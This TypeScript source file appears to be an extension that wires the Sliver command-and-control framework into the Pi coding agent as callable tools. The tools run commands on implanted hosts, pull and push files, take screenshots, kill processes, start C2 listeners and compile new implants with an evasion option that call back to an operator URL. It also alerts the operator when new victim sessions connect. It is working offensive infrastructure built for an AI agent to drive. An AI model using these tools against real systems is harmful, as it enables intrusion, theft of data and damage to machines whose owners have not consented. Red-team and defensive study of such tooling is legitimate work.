/**
 * pi-sliver — Sliver C2 operator client as a Pi extension.
 *
 * Exposes a Sliver server's gRPC operator API to the Pi coding agent as
 * native tools, plus live notifications when new sessions/beacons check in.
 * Uses `sliver-script` (Bishop Fox / moloch--) under the hood — the same
 * operator `.cfg` you'd point `sliver-client` at.
 *
 * Configuration:
 *   PI_SLIVER_CONFIG        Path to an operator .cfg (overrides auto-discovery).
 *   PI_SLIVER_DISABLE       Any non-empty value disables the extension.
 *   PI_SLIVER_DOWNLOAD_DIR  Local dir for downloads/screenshots/built implants.
 *                           Default: $TMPDIR/pi-sliver.
 *
 * Auto-discovery scans ~/.sliver-client/configs/*.cfg and picks the
 * most-recently-modified file. When no config is found, tool calls return a
 * clear error rather than crashing the extension at load time.
 *
 * License: MIT
 */

import type { ExtensionAPI, ExtensionUIContext } from "@mariozechner/pi-coding-agent";
import { Type } from "@sinclair/typebox";
import { homedir, tmpdir } from "node:os";
import { basename, join } from "node:path";
import { mkdirSync, readFileSync, readdirSync, statSync, writeFileSync } from "node:fs";
import { ParseConfigFile, SliverClient, type SliverClientConfig } from "sliver-script";
import type { InteractiveBeacon, InteractiveSession } from "sliver-script";

// ---------------------------------------------------------------------------
// Config + connection state
// ---------------------------------------------------------------------------

const DISABLED = !!process.env.PI_SLIVER_DISABLE;
const CONFIG_OVERRIDE = process.env.PI_SLIVER_CONFIG?.trim();
const DOWNLOAD_DIR = process.env.PI_SLIVER_DOWNLOAD_DIR?.trim() || join(tmpdir(), "pi-sliver");

function discoverConfigPath(): string | undefined {
  if (CONFIG_OVERRIDE) return CONFIG_OVERRIDE;
  const dir = join(homedir(), ".sliver-client", "configs");
  let entries: string[];
  try {
    entries = readdirSync(dir);
  } catch {
    return undefined;
  }
  const cfgs = entries.filter((f) => f.endsWith(".cfg")).map((f) => join(dir, f));
  if (cfgs.length === 0) return undefined;
  cfgs.sort((a, b) => statSync(b).mtimeMs - statSync(a).mtimeMs);
  return cfgs[0];
}

let client: SliverClient | undefined;
let clientConfig: SliverClientConfig | undefined;
let connectPromise: Promise<SliverClient> | undefined;
let configPath: string | undefined = discoverConfigPath();
let lastError: string | undefined;
let uiRef: ExtensionUIContext | undefined;
let eventSub: { unsubscribe: () => void } | undefined;

async function getClient(): Promise<SliverClient> {
  if (client && client.isConnected) return client;
  if (connectPromise) return connectPromise;
  if (!configPath) {
    throw new Error(
      "pi-sliver: no Sliver operator config found. Set PI_SLIVER_CONFIG or place a .cfg under ~/.sliver-client/configs/.",
    );
  }
  connectPromise = (async () => {
    try {
      const cfg = await ParseConfigFile(configPath!);
      const c = new SliverClient(cfg);
      await c.connect();
      client = c;
      clientConfig = cfg;
      lastError = undefined;
      subscribeEvents(c);
      return c;
    } catch (e: any) {
      lastError = e?.message ?? String(e);
      throw e;
    } finally {
      connectPromise = undefined;
    }
  })();
  return connectPromise;
}

function subscribeEvents(c: SliverClient) {
  try {
    eventSub?.unsubscribe();
  } catch {}
  const sub = c.event$.subscribe((event: any) => {
    if (!uiRef) return;
    const t: string = event?.EventType ?? event?.eventType ?? "";
    try {
      if (t === "session-connected" && event.Session) {
        const s = event.Session;
        uiRef.notify(
          `[sliver] new session ${short(s.ID)} ${s.Name ?? ""} → ${s.Username ?? "?"}@${s.Hostname ?? "?"} (${s.OS}/${s.Arch}) from ${s.RemoteAddress ?? "?"}`,
          "info",
        );
      } else if (t === "session-disconnected" && event.Session) {
        uiRef.notify(`[sliver] session ${short(event.Session.ID)} disconnected`, "warning");
      } else if (t === "beacon-registered" && event.Beacon) {
        const b = event.Beacon;
        uiRef.notify(
          `[sliver] new beacon ${short(b.ID)} ${b.Name ?? ""} → ${b.Username ?? "?"}@${b.Hostname ?? "?"} (${b.OS}/${b.Arch})`,
          "info",
        );
      } else if (t === "job-started" && event.Job) {
        const j = event.Job;
        uiRef.notify(`[sliver] job #${j.ID} started: ${j.Name} (${j.Description})`, "info");
      } else if (t === "job-stopped" && event.Job) {
        uiRef.notify(`[sliver] job #${event.Job.ID} stopped`, "info");
      }
    } catch {}
  });
  eventSub = sub as unknown as { unsubscribe: () => void };
}

function short(id: unknown): string {
  return typeof id === "string" ? id.slice(0, 8) : String(id ?? "?");
}

// ---------------------------------------------------------------------------
// Tool helpers
// ---------------------------------------------------------------------------

type Content =
  | { type: "text"; text: string }
  | { type: "image"; data: string; mimeType: string };

type ToolResult = { content: Content[]; details: unknown };

function textResult(text: string, details: unknown = null): ToolResult {
  return { content: [{ type: "text", text }], details };
}
function jsonResult(obj: unknown): ToolResult {
  return { content: [{ type: "text", text: JSON.stringify(obj, null, 2) }], details: obj };
}
function errorResult(e: unknown): ToolResult {
  const msg = e instanceof Error ? e.message : String(e);
  return { content: [{ type: "text", text: `error: ${msg}` }], details: { error: msg } };
}

type TargetParams = { target_type: "session" | "beacon"; target_id: string };

async function getTarget(p: TargetParams): Promise<InteractiveSession | InteractiveBeacon> {
  const c = await getClient();
  if (p.target_type === "beacon") return c.interactBeacon(p.target_id);
  return c.interactSession(p.target_id);
}

const TargetSchema = {
  target_type: Type.Union([Type.Literal("session"), Type.Literal("beacon")], {
    description: "Whether to address an interactive session or an asynchronous beacon",
  }),
  target_id: Type.String({ description: "Session UUID or Beacon UUID (see sliver_sessions / sliver_beacons)" }),
};

function ensureDownloadDir(): string {
  try {
    mkdirSync(DOWNLOAD_DIR, { recursive: true });
  } catch {}
  return DOWNLOAD_DIR;
}

function toBuffer(v: unknown): Buffer {
  if (!v) return Buffer.alloc(0);
  if (Buffer.isBuffer(v)) return v;
  if (v instanceof Uint8Array) return Buffer.from(v);
  if (typeof v === "string") return Buffer.from(v, "base64");
  return Buffer.alloc(0);
}

// Convert a seconds value to a protobuf int64-encoded nanosecond duration.
// sliver-script accepts plain numbers via the generated proto; we coerce
// through Number here since the JS protobuf runtime tolerates it.
function nsFromSeconds(sec: number): number {
  return Math.max(0, Math.floor(sec)) * 1_000_000_000;
}

// ---------------------------------------------------------------------------
// Extension factory
// ---------------------------------------------------------------------------

export default async function piSliverExtension(pi: ExtensionAPI) {
  if (DISABLED) return;

  pi.on("session_start", async (_event, ctx) => {
    if (ctx.hasUI) uiRef = ctx.ui;
    // Best-effort eager connect so events start flowing immediately. Failures
    // are swallowed — tool calls will surface them with a clear message.
    getClient().catch(() => {});
  });

  pi.on("session_shutdown", async () => {
    try {
      eventSub?.unsubscribe();
    } catch {}
    eventSub = undefined;
    try {
      await client?.disconnect();
    } catch {}
    client = undefined;
  });

  // ---- Discovery ----------------------------------------------------------

  pi.registerTool({
    name: "sliver_version",
    label: "Sliver: version",
    description: "Return the Sliver server version, git commit, and build info.",
    parameters: Type.Object({}),
    async execute() {
      try {
        const c = await getClient();
        return jsonResult(await c.getVersion());
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_status",
    label: "Sliver: status",
    description:
      "One-shot snapshot of the Sliver server: which operator config is loaded, server version, connected operators, and counts of active sessions / beacons / jobs.",
    parameters: Type.Object({}),
    async execute() {
      try {
        const c = await getClient();
        const [version, operators, sessions, beacons, jobs] = await Promise.all([
          c.getVersion().catch(() => undefined),
          c.getOperators().catch(() => []),
          c.sessions().catch(() => []),
          c.beacons().catch(() => []),
          c.jobs().catch(() => []),
        ]);
        return jsonResult({
          config_path: configPath,
          operator: clientConfig?.operator,
          server: clientConfig ? `${clientConfig.lhost}:${clientConfig.lport}` : undefined,
          version,
          operators: (operators ?? []).map((o: any) => ({ Name: o.Name, Online: o.Online })),
          counts: {
            sessions: (sessions ?? []).length,
            beacons: (beacons ?? []).length,
            jobs: (jobs ?? []).length,
          },
        });
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_sessions",
    label: "Sliver: list sessions",
    description: "List all active Sliver implant sessions (interactive shells).",
    parameters: Type.Object({}),
    async execute() {
      try {
        const c = await getClient();
        const sessions = (await c.sessions()) ?? [];
        return jsonResult(
          sessions.map((s: any) => ({
            ID: s.ID,
            Name: s.Name,
            Hostname: s.Hostname,
            Username: s.Username,
            UID: s.UID,
            GID: s.GID,
            OS: s.OS,
            Arch: s.Arch,
            Version: s.Version,
            RemoteAddress: s.RemoteAddress,
            PID: s.PID,
            Filename: s.Filename,
            Transport: s.Transport,
            LastCheckin: s.LastCheckin,
            ReconnectInterval: s.ReconnectInterval,
            ProxyURL: s.ProxyURL,
            IsDead: s.IsDead,
            Burned: s.Burned,
          })),
        );
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_beacons",
    label: "Sliver: list beacons",
    description: "List all known Sliver beacons (asynchronous, checkin-based implants).",
    parameters: Type.Object({}),
    async execute() {
      try {
        const c = await getClient();
        return jsonResult((await c.beacons()) ?? []);
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_operators",
    label: "Sliver: operators",
    description: "List operators registered on the Sliver server and whether they are online.",
    parameters: Type.Object({}),
    async execute() {
      try {
        const c = await getClient();
        return jsonResult((await c.getOperators()) ?? []);
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  // ---- Session / beacon interaction --------------------------------------

  pi.registerTool({
    name: "sliver_exec",
    label: "Sliver: execute",
    description:
      "Run a command on an implant (session or beacon). Returns stdout, stderr, exit status, and PID when `output` is true.",
    parameters: Type.Object({
      ...TargetSchema,
      exe: Type.String({ description: "Executable path on the implant (e.g. /usr/bin/whoami, C:\\Windows\\System32\\cmd.exe)" }),
      args: Type.Optional(Type.Array(Type.String(), { description: "Argument vector for the executable", default: [] })),
      output: Type.Optional(Type.Boolean({ description: "Whether to capture and return output. Defaults to true." })),
      timeout: Type.Optional(Type.Number({ description: "Implant-side timeout in seconds", minimum: 1, default: 60 })),
    }),
    async execute(_id, p) {
      try {
        const target = await getTarget(p);
        const res: any = await target.execute(p.exe, p.args ?? [], p.output ?? true, p.timeout);
        return jsonResult({
          status: res?.Status,
          pid: res?.Pid,
          stdout: toBuffer(res?.Stdout).toString("utf8"),
          stderr: toBuffer(res?.Stderr).toString("utf8"),
          response: res?.Response,
        });
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_ls",
    label: "Sliver: ls",
    description: "List a directory on the implant.",
    parameters: Type.Object({
      ...TargetSchema,
      path: Type.Optional(Type.String({ description: "Remote path (defaults to current working dir)" })),
    }),
    async execute(_id, p) {
      try {
        const t = await getTarget(p);
        return jsonResult(await t.ls(p.path));
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_pwd",
    label: "Sliver: pwd",
    description: "Return the implant's current working directory.",
    parameters: Type.Object({ ...TargetSchema }),
    async execute(_id, p) {
      try {
        const t = await getTarget(p);
        return jsonResult(await t.pwd());
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_cd",
    label: "Sliver: cd",
    description: "Change the implant's current working directory.",
    parameters: Type.Object({ ...TargetSchema, path: Type.String({ description: "Target directory" }) }),
    async execute(_id, p) {
      try {
        const t = await getTarget(p);
        return jsonResult(await t.cd(p.path));
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_rm",
    label: "Sliver: rm",
    description: "Delete a file or empty directory on the implant.",
    parameters: Type.Object({ ...TargetSchema, path: Type.String() }),
    async execute(_id, p) {
      try {
        const t = await getTarget(p);
        return jsonResult(await t.rm(p.path));
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_mkdir",
    label: "Sliver: mkdir",
    description: "Create a directory on the implant.",
    parameters: Type.Object({ ...TargetSchema, path: Type.String() }),
    async execute(_id, p) {
      try {
        const t = await getTarget(p);
        return jsonResult(await t.mkdir(p.path));
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_cat",
    label: "Sliver: cat",
    description:
      "Read a small text file from the implant and return its contents inline. Truncates after `max_bytes`. For binary or large files use sliver_download instead.",
    parameters: Type.Object({
      ...TargetSchema,
      path: Type.String(),
      max_bytes: Type.Optional(Type.Number({ description: "Truncate after this many bytes (default 65536)", default: 65536 })),
    }),
    async execute(_id, p) {
      try {
        const t = await getTarget(p);
        const buf = await t.download(p.path);
        const limit = p.max_bytes ?? 65536;
        const out = buf.subarray(0, limit).toString("utf8");
        return textResult(
          buf.length > limit
            ? `${out}\n\n[...truncated, ${buf.length - limit} more bytes — use sliver_download for the full file]`
            : out,
          { bytes: buf.length, truncated: buf.length > limit },
        );
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_download",
    label: "Sliver: download",
    description:
      "Download a file from the implant to the pi-sliver download dir on the operator box. Returns the local path and byte size.",
    parameters: Type.Object({
      ...TargetSchema,
      remote_path: Type.String(),
      local_name: Type.Optional(Type.String({ description: "Filename to save under (default: basename of remote_path)" })),
    }),
    async execute(_id, p) {
      try {
        const t = await getTarget(p);
        const buf = await t.download(p.remote_path);
        const dir = ensureDownloadDir();
        const local = join(dir, p.local_name ?? basename(p.remote_path));
        writeFileSync(local, buf);
        return jsonResult({ local_path: local, bytes: buf.length });
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_upload",
    label: "Sliver: upload",
    description: "Upload a local file from the operator box to a path on the implant.",
    parameters: Type.Object({
      ...TargetSchema,
      local_path: Type.String({ description: "Source file on the operator box" }),
      remote_path: Type.String({ description: "Destination path on the implant" }),
    }),
    async execute(_id, p) {
      try {
        const t = await getTarget(p);
        const data = readFileSync(p.local_path);
        return jsonResult(await t.upload(p.remote_path, data));
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_ps",
    label: "Sliver: ps",
    description: "Process list on the implant.",
    parameters: Type.Object({ ...TargetSchema }),
    async execute(_id, p) {
      try {
        const t = await getTarget(p);
        return jsonResult(await t.ps());
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_netstat",
    label: "Sliver: netstat",
    description: "Active network connections on the implant.",
    parameters: Type.Object({ ...TargetSchema }),
    async execute(_id, p) {
      try {
        const t = await getTarget(p);
        return jsonResult(await t.netstat());
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_ifconfig",
    label: "Sliver: ifconfig",
    description: "Network interfaces and IP configuration on the implant.",
    parameters: Type.Object({ ...TargetSchema }),
    async execute(_id, p) {
      try {
        const t = await getTarget(p);
        return jsonResult(await t.ifconfig());
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_terminate",
    label: "Sliver: terminate process",
    description: "Kill a process on the implant by PID.",
    parameters: Type.Object({ ...TargetSchema, pid: Type.Number() }),
    async execute(_id, p) {
      try {
        const t = await getTarget(p);
        return jsonResult(await t.terminate(p.pid));
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_screenshot",
    label: "Sliver: screenshot",
    description:
      "Capture a screenshot from the implant host. Returns the image inline AND saves a PNG to the pi-sliver download dir.",
    parameters: Type.Object({ ...TargetSchema }),
    async execute(_id, p) {
      try {
        const t = await getTarget(p);
        const shot: any = await t.screenshot();
        const buf = toBuffer(shot?.Data);
        const dir = ensureDownloadDir();
        const path = join(dir, `screenshot-${Date.now()}.png`);
        writeFileSync(path, buf);
        return {
          content: [
            { type: "image", data: buf.toString("base64"), mimeType: "image/png" },
            { type: "text", text: `saved to ${path} (${buf.length} bytes)` },
          ],
          details: { local_path: path, bytes: buf.length },
        };
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  // ---- Jobs & listeners ---------------------------------------------------

  pi.registerTool({
    name: "sliver_jobs",
    label: "Sliver: list jobs",
    description: "List active server-side jobs (listeners, etc).",
    parameters: Type.Object({}),
    async execute() {
      try {
        const c = await getClient();
        return jsonResult((await c.jobs()) ?? []);
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_job_kill",
    label: "Sliver: kill job",
    description: "Stop a job by numeric ID (e.g. tear down a listener).",
    parameters: Type.Object({ job_id: Type.Number() }),
    async execute(_id, p) {
      try {
        const c = await getClient();
        return jsonResult(await c.killJob(p.job_id));
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_listener_mtls",
    label: "Sliver: start mTLS listener",
    description: "Start an mTLS C2 listener on the server.",
    parameters: Type.Object({
      host: Type.String({ description: "Bind address (e.g. 0.0.0.0)" }),
      port: Type.Number({ minimum: 1, maximum: 65535 }),
      persistent: Type.Optional(Type.Boolean({ default: false })),
    }),
    async execute(_id, p) {
      try {
        const c = await getClient();
        return jsonResult(await c.startMTLSListener(p.host, p.port, p.persistent));
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_listener_http",
    label: "Sliver: start HTTP listener",
    description: "Start an HTTP C2 listener.",
    parameters: Type.Object({
      domain: Type.String({ description: "Domain advertised to implants (can be empty)" }),
      host: Type.String({ description: "Bind address" }),
      port: Type.Number({ minimum: 1, maximum: 65535 }),
      website: Type.Optional(Type.String()),
      persistent: Type.Optional(Type.Boolean({ default: false })),
    }),
    async execute(_id, p) {
      try {
        const c = await getClient();
        return jsonResult(await c.startHTTPListener(p.domain, p.host, p.port, p.website, p.persistent));
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_listener_https",
    label: "Sliver: start HTTPS listener",
    description: "Start an HTTPS C2 listener (optionally via ACME).",
    parameters: Type.Object({
      domain: Type.String(),
      host: Type.String(),
      port: Type.Number({ minimum: 1, maximum: 65535 }),
      acme: Type.Optional(Type.Boolean({ default: false })),
      website: Type.Optional(Type.String()),
      persistent: Type.Optional(Type.Boolean({ default: false })),
    }),
    async execute(_id, p) {
      try {
        const c = await getClient();
        return jsonResult(
          await c.startHTTPSListener(
            p.domain,
            p.host,
            p.port,
            p.acme,
            p.website,
            undefined,
            undefined,
            p.persistent,
          ),
        );
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_listener_dns",
    label: "Sliver: start DNS listener",
    description: "Start a DNS C2 listener.",
    parameters: Type.Object({
      domains: Type.Array(Type.String(), { minItems: 1 }),
      canaries: Type.Optional(Type.Boolean({ default: true })),
      host: Type.String(),
      port: Type.Number({ minimum: 1, maximum: 65535, default: 53 }),
      persistent: Type.Optional(Type.Boolean({ default: false })),
    }),
    async execute(_id, p) {
      try {
        const c = await getClient();
        return jsonResult(
          await c.startDNSListener(p.domains, p.canaries ?? true, p.host, p.port, p.persistent),
        );
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_listener_wg",
    label: "Sliver: start WireGuard listener",
    description: "Start a WireGuard C2 listener.",
    parameters: Type.Object({
      port: Type.Number(),
      n_port: Type.Number({ description: "Implant n-port" }),
      key_port: Type.Number({ description: "Key exchange port" }),
      persistent: Type.Optional(Type.Boolean({ default: false })),
    }),
    async execute(_id, p) {
      try {
        const c = await getClient();
        return jsonResult(await c.startWGListener(p.port, p.n_port, p.key_port, p.persistent));
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  // ---- Implant builds -----------------------------------------------------

  pi.registerTool({
    name: "sliver_implants",
    label: "Sliver: list implant builds",
    description: "List previously built implant binaries on the server.",
    parameters: Type.Object({}),
    async execute() {
      try {
        const c = await getClient();
        return jsonResult(await c.implantBuilds());
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_implant_regenerate",
    label: "Sliver: regenerate implant",
    description:
      "Re-fetch a previously built implant binary by name. Saves it to the pi-sliver download dir and returns the path.",
    parameters: Type.Object({ name: Type.String() }),
    async execute(_id, p) {
      try {
        const c = await getClient();
        const f: any = await c.regenerate(p.name);
        const buf = toBuffer(f?.Data);
        const dir = ensureDownloadDir();
        const path = join(dir, f?.Name ?? p.name);
        writeFileSync(path, buf);
        return jsonResult({ local_path: path, bytes: buf.length, name: f?.Name });
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_implant_delete",
    label: "Sliver: delete implant build",
    description: "Remove a built implant binary from the server's build cache.",
    parameters: Type.Object({ name: Type.String() }),
    async execute(_id, p) {
      try {
        const c = await getClient();
        await c.deleteImplantBuild(p.name);
        return textResult(`deleted ${p.name}`, { name: p.name });
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  pi.registerTool({
    name: "sliver_implant_generate",
    label: "Sliver: generate implant",
    description:
      "Compile a new Sliver implant. Saves the binary to the pi-sliver download dir and returns the local path.",
    parameters: Type.Object({
      name: Type.String({ description: "Implant name (also used as binary filename)" }),
      os: Type.Union(
        [Type.Literal("linux"), Type.Literal("darwin"), Type.Literal("windows")],
        { description: "Target operating system" },
      ),
      arch: Type.Optional(
        Type.Union([Type.Literal("amd64"), Type.Literal("386"), Type.Literal("arm64")], {
          description: "Target architecture",
          default: "amd64",
        }),
      ),
      format: Type.Optional(
        Type.Union(
          [
            Type.Literal("EXECUTABLE"),
            Type.Literal("SHARED_LIB"),
            Type.Literal("SERVICE"),
            Type.Literal("SHELLCODE"),
          ],
          { description: "Output format", default: "EXECUTABLE" },
        ),
      ),
      c2_url: Type.String({
        description: "C2 URL the implant will dial back to, e.g. mtls://operator.example:8443",
      }),
      is_beacon: Type.Optional(
        Type.Boolean({ description: "If true, build a beacon (checkin-based)", default: false }),
      ),
      beacon_interval_seconds: Type.Optional(Type.Number({ default: 60 })),
      beacon_jitter_seconds: Type.Optional(Type.Number({ default: 30 })),
      debug: Type.Optional(Type.Boolean({ default: false })),
      evasion: Type.Optional(Type.Boolean({ default: false })),
    }),
    async execute(_id, p) {
      try {
        const c = await getClient();
        const formatMap: Record<string, number> = {
          EXECUTABLE: 0,
          SHARED_LIB: 1,
          SERVICE: 2,
          SHELLCODE: 3,
        };
        const config: any = {
          Name: p.name,
          GOOS: p.os,
          GOARCH: p.arch ?? "amd64",
          Format: formatMap[p.format ?? "EXECUTABLE"] ?? 0,
          IsBeacon: p.is_beacon ?? false,
          BeaconInterval: nsFromSeconds(p.beacon_interval_seconds ?? 60),
          BeaconJitter: nsFromSeconds(p.beacon_jitter_seconds ?? 30),
          Debug: p.debug ?? false,
          Evasion: p.evasion ?? false,
          C2: [{ URL: p.c2_url, Priority: 0 }],
          ReconnectInterval: nsFromSeconds(60),
          PollInterval: 0,
          MaxConnectionErrors: 1000,
        };
        const f: any = await c.generate(config);
        const buf = toBuffer(f?.Data);
        const dir = ensureDownloadDir();
        const local = join(dir, f?.Name ?? p.name);
        writeFileSync(local, buf);
        return jsonResult({ local_path: local, bytes: buf.length, name: f?.Name });
      } catch (e) {
        return errorResult(e);
      }
    },
  });

  // ---- /sliver command ----------------------------------------------------

  pi.registerCommand("sliver", {
    description: "pi-sliver controls — usage: /sliver [status|config|reconnect|disconnect]",
    handler: async (args, ctx) => {
      const cmd = args.trim().toLowerCase();
      const ui = ctx.ui;
      if (cmd === "" || cmd === "status") {
        const connected = !!client?.isConnected;
        const lines = [
          `pi-sliver: ${connected ? "connected" : "disconnected"}`,
          configPath
            ? `config: ${configPath}`
            : "config: <none — set PI_SLIVER_CONFIG or place a .cfg under ~/.sliver-client/configs/>",
          clientConfig
            ? `server: ${clientConfig.operator}@${clientConfig.lhost}:${clientConfig.lport}`
            : "server: -",
          lastError ? `last error: ${lastError}` : "",
          `download dir: ${DOWNLOAD_DIR}`,
        ].filter(Boolean);
        ui.notify(lines.join("\n"), connected ? "info" : "warning");
        return;
      }
      if (cmd === "config") {
        ui.notify(configPath ?? "no config selected", "info");
        return;
      }
      if (cmd === "reconnect") {
        try {
          eventSub?.unsubscribe();
        } catch {}
        eventSub = undefined;
        try {
          await client?.disconnect();
        } catch {}
        client = undefined;
        configPath = discoverConfigPath();
        try {
          await getClient();
          ui.notify("pi-sliver: reconnected", "info");
        } catch (e: any) {
          ui.notify(`pi-sliver: reconnect failed — ${e?.message ?? e}`, "error");
        }
        return;
      }
      if (cmd === "disconnect") {
        try {
          eventSub?.unsubscribe();
        } catch {}
        eventSub = undefined;
        try {
          await client?.disconnect();
        } catch {}
        client = undefined;
        ui.notify("pi-sliver: disconnected", "info");
        return;
      }
      ui.notify(
        "pi-sliver: usage — /sliver [status|config|reconnect|disconnect]",
        "info",
      );
    },
  });
}
